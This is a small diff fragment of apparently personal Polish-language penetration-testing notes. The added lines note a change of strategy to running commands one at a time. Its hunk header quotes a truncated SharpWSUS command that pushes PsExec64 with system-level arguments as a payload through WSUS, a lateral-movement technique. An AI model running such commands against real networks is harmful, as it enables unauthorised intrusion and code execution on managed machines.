@@ -194,3 +194,8 @@ sharpwsus.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -
 teraz mamy 1/4, a nie 1/3. Zawsze jakaś zmiana xD
 
 
+# tutuaj wróć po świętach
+zmieniłem strategię o odpalam komendy pojedynczo.
+```
+
+```
